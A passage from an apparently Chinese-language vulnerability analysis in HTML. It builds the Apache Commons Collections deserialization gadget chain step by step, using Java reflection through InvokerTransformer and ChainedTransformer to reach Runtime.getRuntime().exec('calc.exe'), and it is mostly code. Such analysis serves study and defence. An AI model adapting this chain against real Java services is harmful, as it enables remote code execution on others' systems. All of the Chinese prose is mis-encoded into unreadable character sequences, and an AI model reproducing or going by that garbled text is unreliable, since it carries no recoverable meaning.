</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=p>}</span><span class=w> </span><span class=k>catch</span><span class=w> </span><span class=p>(</span><span class=n>InvocationTargetException</span><span class=w> </span><span class=n>ex</span><span class=p>)</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=k>throw</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>FunctorException</span><span class=p>(</span><span class=s>&#34;InvokerTransformer: The method &#39;&#34;</span><span class=w> </span><span class=o>+</span><span class=w> </span><span class=n>iMethodName</span><span class=w> </span><span class=o>+</span><span class=w> </span><span class=s>&#34;&#39; on &#39;&#34;</span><span class=w> </span><span class=o>+</span><span class=w> </span><span class=n>input</span><span class=p>.</span><span class=na>getClass</span><span class=p>()</span><span class=w> </span><span class=o>+</span><span class=w> </span><span class=s>&#34;&#39; threw an exception&#34;</span><span class=p>,</span><span class=w> </span><span class=n>ex</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=p>}</span><span class=w>
</span></span></span></code></pre></td></tr></table></div></div><p>æ­¤å¤„æ˜¯æ•´ä¸ªPoCçš„å…³é”®ï¼Œå…³é”®ä»£ç æ˜¯1ã€2ã€3å¤„ï¼Œè¿™é‡Œå’Œä¸Šé¢çš„java.lang.Runtimeæœ€ç»ˆæ„æˆäº†Runtime.getRuntime().exec(&ldquo;calc.exe&rdquo;)ã€‚</p><p>ä¸‹é¢é‡ç‚¹åˆ†ææ­¤å¤„ä»£ç ã€‚</p><h4 id=pocæ„é€ åˆ†æ>PoCæ„é€ åˆ†æ</h4><h5 id=é€šè¿‡åå°„å®ç°runtimegetruntimeexeccalcexe>é€šè¿‡åå°„å®ç°Runtime.getRuntime().exec(&ldquo;calc.exe&rdquo;)</h5><p>éœ€è¦äº†è§£Javaåå°„ä»¥åŠforNameã€getMethodã€invokeå‡½æ•°ã€‚</p><p>ä¸‹é¢ä¸»è¦çœ‹ä¸‹æºç é‡Œå¯¹è¿™ä¸‰ä¸ªå‡½æ•°çš„æ³¨é‡Šæè¿°ã€‚</p><h6 id=forname>forName</h6><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-java data-lang=java><span class=line><span class=cl><span class=w>    </span><span class=cm>/**
</span></span></span><span class=line><span class=cl><span class=cm>     * Returns the Class object associated with the class or interface with the given string name.
</span></span></span><span class=line><span class=cl><span class=cm>     * @param      className   the fully qualified name of the desired class.
</span></span></span><span class=line><span class=cl><span class=cm>     * @return     the Class object for the class with the specified name.  
</span></span></span><span class=line><span class=cl><span class=cm>     */</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=nd>@CallerSensitive</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=kd>public</span><span class=w> </span><span class=kd>static</span><span class=w> </span><span class=n>Class</span><span class=o>&lt;?&gt;</span><span class=w> </span><span class=n>forName</span><span class=p>(</span><span class=n>String</span><span class=w> </span><span class=n>className</span><span class=p>)</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=kd>throws</span><span class=w> </span><span class=n>ClassNotFoundException</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>Class</span><span class=o>&lt;?&gt;</span><span class=w> </span><span class=n>caller</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>Reflection</span><span class=p>.</span><span class=na>getCallerClass</span><span class=p>();</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=k>return</span><span class=w> </span><span class=n>forName0</span><span class=p>(</span><span class=n>className</span><span class=p>,</span><span class=w> </span><span class=kc>true</span><span class=p>,</span><span class=w> </span><span class=n>ClassLoader</span><span class=p>.</span><span class=na>getClassLoader</span><span class=p>(</span><span class=n>caller</span><span class=p>),</span><span class=w> </span><span class=n>caller</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=p>}</span><span class=w>
</span></span></span></code></pre></td></tr></table></div></div><h6 id=getmethod>getMethod</h6><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-java data-lang=java><span class=line><span class=cl><span class=w>    </span><span class=cm>/**
</span></span></span><span class=line><span class=cl><span class=cm>     * Returns a Method object that reflects the specified public member method of the class or interface represented by this Class object.
</span></span></span><span class=line><span class=cl><span class=cm>     * The name parameter is a String specifying the simple name of the desired method.
</span></span></span><span class=line><span class=cl><span class=cm>     * The parameterTypes parameter is an array of Class objects that identify the method&#39;s formal parameter types, in declared order.
</span></span></span><span class=line><span class=cl><span class=cm>     * If parameterTypes is null, it is treated as if it were an empty array.
</span></span></span><span class=line><span class=cl><span class=cm>     * 
</span></span></span><span class=line><span class=cl><span class=cm>     * Static methods declared in superinterfaces of the class or interface
</span></span></span><span class=line><span class=cl><span class=cm>     * represented by this Class object are not considered members of
</span></span></span><span class=line><span class=cl><span class=cm>     * the class or interface.
</span></span></span><span class=line><span class=cl><span class=cm>     *
</span></span></span><span class=line><span class=cl><span class=cm>     * @param name the name of the method
</span></span></span><span class=line><span class=cl><span class=cm>     * @param parameterTypes the list of parameters
</span></span></span><span class=line><span class=cl><span class=cm>     * @return the Method object that matches the specified name and parameterTypes
</span></span></span><span class=line><span class=cl><span class=cm>     */</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=nd>@CallerSensitive</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=kd>public</span><span class=w> </span><span class=n>Method</span><span class=w> </span><span class=nf>getMethod</span><span class=p>(</span><span class=n>String</span><span class=w> </span><span class=n>name</span><span class=p>,</span><span class=w> </span><span class=n>Class</span><span class=o>&lt;?&gt;</span><span class=p>...</span><span class=w> </span><span class=n>parameterTypes</span><span class=p>)</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=kd>throws</span><span class=w> </span><span class=n>NoSuchMethodException</span><span class=p>,</span><span class=w> </span><span class=n>SecurityException</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>checkMemberAccess</span><span class=p>(</span><span class=n>Member</span><span class=p>.</span><span class=na>PUBLIC</span><span class=p>,</span><span class=w> </span><span class=n>Reflection</span><span class=p>.</span><span class=na>getCallerClass</span><span class=p>(),</span><span class=w> </span><span class=kc>true</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>Method</span><span class=w> </span><span class=n>method</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>getMethod0</span><span class=p>(</span><span class=n>name</span><span class=p>,</span><span class=w> </span><span class=n>parameterTypes</span><span class=p>,</span><span class=w> </span><span class=kc>true</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=n>method</span><span class=w> </span><span class=o>==</span><span class=w> </span><span class=kc>null</span><span class=p>)</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=k>throw</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>NoSuchMethodException</span><span class=p>(</span><span class=n>getName</span><span class=p>()</span><span class=w> </span><span class=o>+</span><span class=w> </span><span class=s>&#34;.&#34;</span><span class=w> </span><span class=o>+</span><span class=w> </span><span class=n>name</span><span class=w> </span><span class=o>+</span><span class=w> </span><span class=n>argumentTypesToString</span><span class=p>(</span><span class=n>parameterTypes</span><span class=p>));</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=k>return</span><span class=w> </span><span class=n>method</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=p>}</span><span class=w>
</span></span></span></code></pre></td></tr></table></div></div><h6 id=invoke>invoke</h6><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-java data-lang=java><span class=line><span class=cl><span class=w>    </span><span class=cm>/**
</span></span></span><span class=line><span class=cl><span class=cm>     * Invokes the underlying method represented by this Method
</span></span></span><span class=line><span class=cl><span class=cm>     * object, on the specified object with the specified parameters.
</span></span></span><span class=line><span class=cl><span class=cm>	 *
</span></span></span><span class=line><span class=cl><span class=cm>     * If the underlying method is static, then the specified obj argument is ignored. It may be null
</span></span></span><span class=line><span class=cl><span class=cm>	 *
</span></span></span><span class=line><span class=cl><span class=cm>     * @param obj  the object the underlying method is invoked from
</span></span></span><span class=line><span class=cl><span class=cm>     * @param args the arguments used for the method call
</span></span></span><span class=line><span class=cl><span class=cm>     * @return the result of dispatching the method represented by
</span></span></span><span class=line><span class=cl><span class=cm>     */</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>	</span><span class=nd>@CallerSensitive</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=kd>public</span><span class=w> </span><span class=n>Object</span><span class=w> </span><span class=nf>invoke</span><span class=p>(</span><span class=n>Object</span><span class=w> </span><span class=n>obj</span><span class=p>,</span><span class=w> </span><span class=n>Object</span><span class=p>...</span><span class=w> </span><span class=n>args</span><span class=p>)</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=kd>throws</span><span class=w> </span><span class=n>IllegalAccessException</span><span class=p>,</span><span class=w> </span><span class=n>IllegalArgumentException</span><span class=p>,</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>           </span><span class=n>InvocationTargetException</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=o>!</span><span class=n>override</span><span class=p>)</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=o>!</span><span class=n>Reflection</span><span class=p>.</span><span class=na>quickCheckMemberAccess</span><span class=p>(</span><span class=n>clazz</span><span class=p>,</span><span class=w> </span><span class=n>modifiers</span><span class=p>))</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=n>Class</span><span class=o>&lt;?&gt;</span><span class=w> </span><span class=n>caller</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>Reflection</span><span class=p>.</span><span class=na>getCallerClass</span><span class=p>();</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=n>checkAccess</span><span class=p>(</span><span class=n>caller</span><span class=p>,</span><span class=w> </span><span class=n>clazz</span><span class=p>,</span><span class=w> </span><span class=n>obj</span><span class=p>,</span><span class=w> </span><span class=n>modifiers</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>MethodAccessor</span><span class=w> </span><span class=n>ma</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>methodAccessor</span><span class=p>;</span><span class=w>             </span><span class=c1>// read volatile</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=n>ma</span><span class=w> </span><span class=o>==</span><span class=w> </span><span class=kc>null</span><span class=p>)</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=n>ma</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>acquireMethodAccessor</span><span class=p>();</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=k>return</span><span class=w> </span><span class=n>ma</span><span class=p>.</span><span class=na>invoke</span><span class=p>(</span><span class=n>obj</span><span class=p>,</span><span class=w> </span><span class=n>args</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=p>}</span><span class=w>
</span></span></span></code></pre></td></tr></table></div></div><p>å› æ­¤æœ‰</p><p>â€‹<code>[Runtimeç±»].getMethod([æ–¹æ³•exec]).invoke([Runtimeå®ä¾‹],[å‚æ•°calc.exe])</code>â€‹</p><p>ç”±äºRuntimeçš„æ— å‚æ„é€ å‡½æ•°ç”±privateä¿®é¥°ï¼Œå› ä¸ºæ— æ³•ç”¨newInstanceæ„é€ ï¼Œé‡‡ç”¨getRuntimeæ–¹æ³•æ„é€ ã€‚</p><p>å› æ­¤æœ‰åå°„æ„é€ ï¼š</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span><span class=lnt>8
</span><span class=lnt>9
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-java data-lang=java><span class=line><span class=cl><span class=n>Class</span><span class=p>.</span><span class=na>forName</span><span class=p>(</span><span class=s>&#34;java.lang.Runtime&#34;</span><span class=p>)</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=p>.</span><span class=na>getMethod</span><span class=p>(</span><span class=s>&#34;exec&#34;</span><span class=p>,</span><span class=w> </span><span class=n>String</span><span class=p>.</span><span class=na>class</span><span class=p>)</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=p>.</span><span class=na>invoke</span><span class=p>(</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                        </span><span class=n>Class</span><span class=p>.</span><span class=na>forName</span><span class=p>(</span><span class=s>&#34;java.lang.Runtime&#34;</span><span class=p>)</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                                </span><span class=p>.</span><span class=na>getMethod</span><span class=p>(</span><span class=s>&#34;getRuntime&#34;</span><span class=p>)</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                                </span><span class=p>.</span><span class=na>invoke</span><span class=p>(</span><span class=n>Class</span><span class=p>.</span><span class=na>forName</span><span class=p>(</span><span class=s>&#34;java.lang.Runtime&#34;</span><span class=p>))</span><span class=c1>//æ­¤å¤„åœ¨è·å–ç±»</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                        </span><span class=p>,</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                        </span><span class=s>&#34;calc.exe&#34;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=p>);</span><span class=w>
</span></span></span></code></pre></td></tr></table></div></div><p>invokeæºç ä¸­å¯¹è¯¥å‡½æ•°æœ‰ä¸€æ®µç‰¹åˆ«é‡è¦çš„æ³¨é‡Šï¼Œå•ç‹¬æ‹¿å‡ºæ¥è¯´ï¼š</p><p><strong>If the underlying method is static, then the specified obj argument is ignored. It may be null</strong></p><p>å› ä¸ºgetMethodæ˜¯staticæ–¹æ³•ï¼Œå› æ­¤åå°„æ„é€ å¯ä»¥æ”¹å†™ä¸ºï¼š</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span><span class=lnt>8
</span><span class=lnt>9
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-java data-lang=java><span class=line><span class=cl><span class=n>Class</span><span class=p>.</span><span class=na>forName</span><span class=p>(</span><span class=s>&#34;java.lang.Runtime&#34;</span><span class=p>)</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=p>.</span><span class=na>getMethod</span><span class=p>(</span><span class=s>&#34;exec&#34;</span><span class=p>,</span><span class=w> </span><span class=n>String</span><span class=p>.</span><span class=na>class</span><span class=p>)</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=p>.</span><span class=na>invoke</span><span class=p>(</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                        </span><span class=n>Class</span><span class=p>.</span><span class=na>forName</span><span class=p>(</span><span class=s>&#34;java.lang.Runtime&#34;</span><span class=p>)</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                                </span><span class=p>.</span><span class=na>getMethod</span><span class=p>(</span><span class=s>&#34;getRuntime&#34;</span><span class=p>)</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                                </span><span class=p>.</span><span class=na>invoke</span><span class=p>(</span><span class=kc>null</span><span class=p>)</span><span class=c1>//æ­¤å¤„åœ¨è·å–ç±»</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                        </span><span class=p>,</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                        </span><span class=s>&#34;calc.exe&#34;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=p>);</span><span class=w>
</span></span></span></code></pre></td></tr></table></div></div><h5 id=ä¾æ®åå°„æ„é€ chainedtransformer>ä¾æ®åå°„æ„é€ ChainedTransformer</h5><p>InvokerTransformeré‡Œæœ‰ä¸€æ®µé‡è¦ä»£ç æ˜¯æ„é€ çš„å…³é”®ï¼š</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-java data-lang=java><span class=line><span class=cl><span class=n>Class</span><span class=w> </span><span class=n>cls</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>input</span><span class=p>.</span><span class=na>getClass</span><span class=p>();</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=n>Method</span><span class=w> </span><span class=n>method</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>cls</span><span class=p>.</span><span class=na>getMethod</span><span class=p>(</span><span class=n>iMethodName</span><span class=p>,</span><span class=w> </span><span class=n>iParamTypes</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=k>return</span><span class=w> </span><span class=n>method</span><span class=p>.</span><span class=na>invoke</span><span class=p>(</span><span class=n>input</span><span class=p>,</span><span class=w> </span><span class=n>iArgs</span><span class=p>);</span><span class=w>
</span></span></span></code></pre></td></tr></table></div></div><p>æ”¹é€ ä¸€ä¸‹ä¾¿æ˜¯ï¼š</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-java data-lang=java><span class=line><span class=cl><span class=n>input</span><span class=p>.</span><span class=na>getClass</span><span class=p>()</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>		</span><span class=p>.</span><span class=na>getMethod</span><span class=p>(</span><span class=n>iMethodName</span><span class=p>,</span><span class=w> </span><span class=n>iParamTypes</span><span class=p>)</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>		</span><span class=p>.</span><span class=na>invoke</span><span class=p>(</span><span class=n>input</span><span class=p>,</span><span class=w> </span><span class=n>iArgs</span><span class=p>)</span><span class=w>
</span></span></span></code></pre></td></tr></table></div></div><p>æ ¹æ®è¯¥ç»“æ„æ”¹é€ åå°„æ„é€ ï¼š</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span><span class=lnt>8
</span><span class=lnt>9
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-java data-lang=java><span class=line><span class=cl><span class=n>Class</span><span class=p>.</span><span class=na>forName</span><span class=p>(</span><span class=s>&#34;java.lang.Runtime&#34;</span><span class=p>).</span><span class=na>getMethod</span><span class=p>(</span><span class=s>&#34;getRuntime&#34;</span><span class=p>).</span><span class=na>invoke</span><span class=p>(</span><span class=kc>null</span><span class=p>).</span><span class=na>getClass</span><span class=p>()</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=p>.</span><span class=na>getMethod</span><span class=p>(</span><span class=s>&#34;exec&#34;</span><span class=p>,</span><span class=w> </span><span class=n>String</span><span class=p>.</span><span class=na>class</span><span class=p>)</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=p>.</span><span class=na>invoke</span><span class=p>(</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                        </span><span class=n>Class</span><span class=p>.</span><span class=na>forName</span><span class=p>(</span><span class=s>&#34;java.lang.Runtime&#34;</span><span class=p>)</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                                </span><span class=p>.</span><span class=na>getMethod</span><span class=p>(</span><span class=s>&#34;getRuntime&#34;</span><span class=p>)</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                                </span><span class=p>.</span><span class=na>invoke</span><span class=p>(</span><span class=kc>null</span><span class=p>)</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                        </span><span class=p>,</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                        </span><span class=s>&#34;calc.exe&#34;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=p>);</span><span class=w>
</span></span></span></code></pre></td></tr></table></div></div><p>å³ä¸ºäº†åŒ¹é…æ ·å¼ï¼ŒæŠŠ<code>Class.forName("java.lang.Runtime")</code>â€‹æ”¹ä¸º<code>Class.forName("java.lang.Runtime").getMethod("getRuntime").invoke(null).getClass()</code>â€‹ã€‚</p><p>æ ¹æ®ChainedTransformerçš„æºç å¯çŸ¥ï¼Œä¸Šä¸€å±‚transformçš„ç»“æœä¼šæ˜¯è¿™ä¸€å±‚transformçš„å‚æ•°ï¼Œå› æ­¤æœ‰ï¼š</p><h6 id=step1>step1</h6><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-java data-lang=java><span class=line><span class=cl><span class=n>Object</span><span class=w> </span><span class=n>input</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>Class</span><span class=p>.</span><span class=na>forName</span><span class=p>(</span><span class=s>&#34;java.lang.Runtime&#34;</span><span class=p>).</span><span class=na>getMethod</span><span class=p>(</span><span class=s>&#34;getRuntime&#34;</span><span class=p>).</span><span class=na>invoke</span><span class=p>(</span><span class=kc>null</span><span class=p>)</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=k>return</span><span class=w> </span><span class=n>input</span><span class=p>.</span><span class=na>getClass</span><span class=p>()</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>		</span><span class=p>.</span><span class=na>getMethod</span><span class=p>(</span><span class=s>&#34;exec&#34;</span><span class=p>,</span><span class=w> </span><span class=n>String</span><span class=p>.</span><span class=na>class</span><span class=p>)</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>		</span><span class=p>.</span><span class=na>invoke</span><span class=p>(</span><span class=n>input</span><span class=p>,</span><span class=w> </span><span class=s>&#34;calc.exe&#34;</span><span class=p>)</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=k>new</span><span class=w> </span><span class=n>InvokerTransformer</span><span class=p>(</span><span class=s>&#34;exec&#34;</span><span class=p>,</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>Class</span><span class=o>[]</span><span class=w> </span><span class=p>{</span><span class=n>String</span><span class=p>.</span><span class=na>class</span><span class=w> </span><span class=p>},</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>Object</span><span class=o>[]</span><span class=w> </span><span class=p>{</span><span class=s>&#34;calc.exe&#34;</span><span class=p>})</span><span class=w>
</span></span></span></code></pre></td></tr></table></div></div><h6 id=step2>step2</h6><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-java data-lang=java><span class=line><span class=cl><span class=n>Object</span><span class=w> </span><span class=n>input</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>Class</span><span class=p>.</span><span class=na>forName</span><span class=p>(</span><span class=s>&#34;java.lang.Runtime&#34;</span><span class=p>).</span><span class=na>getMethod</span><span class=p>(</span><span class=s>&#34;getRuntime&#34;</span><span class=p>)</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=k>return</span><span class=w> </span><span class=n>input</span><span class=p>.</span><span class=na>getClass</span><span class=p>()</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>		</span><span class=p>.</span><span class=na>getMethod</span><span class=p>(</span><span class=s>&#34;invoke&#34;</span><span class=p>,</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>Class</span><span class=o>[]</span><span class=w> </span><span class=p>{</span><span class=n>Object</span><span class=p>.</span><span class=na>class</span><span class=p>,</span><span class=w> </span><span class=n>Object</span><span class=o>[]</span><span class=p>.</span><span class=na>class</span><span class=p>})</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>		</span><span class=p>.</span><span class=na>invoke</span><span class=p>(</span><span class=n>input</span><span class=p>,</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>Object</span><span class=o>[]</span><span class=w> </span><span class=p>{</span><span class=kc>null</span><span class=p>,</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>Object</span><span class=o>[</span><span class=n>0</span><span class=o>]</span><span class=p>})</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=k>new</span><span class=w> </span><span class=n>InvokerTransformer</span><span class=p>(</span><span class=s>&#34;invoke&#34;</span><span class=p>,</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>Class</span><span class=o>[]</span><span class=w> </span><span class=p>{</span><span class=n>Object</span><span class=p>.</span><span class=na>class</span><span class=p>,</span><span class=w> </span><span class=n>Object</span><span class=o>[]</span><span class=p>.</span><span class=na>class</span><span class=p>},</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>Object</span><span class=o>[]</span><span class=w> </span><span class=p>{</span><span class=kc>null</span><span class=p>,</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>Object</span><span class=o>[</span><span class=n>0</span><span class=o>]</span><span class=p>})</span><span class=w>
</span></span></span></code></pre></td></tr></table></div></div><h6 id=step3>step3</h6><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-java data-lang=java><span class=line><span class=cl><span class=n>Object</span><span class=w> </span><span class=n>input</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>Class</span><span class=p>.</span><span class=na>forName</span><span class=p>(</span><span class=s>&#34;java.lang.Runtime&#34;</span><span class=p>)</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
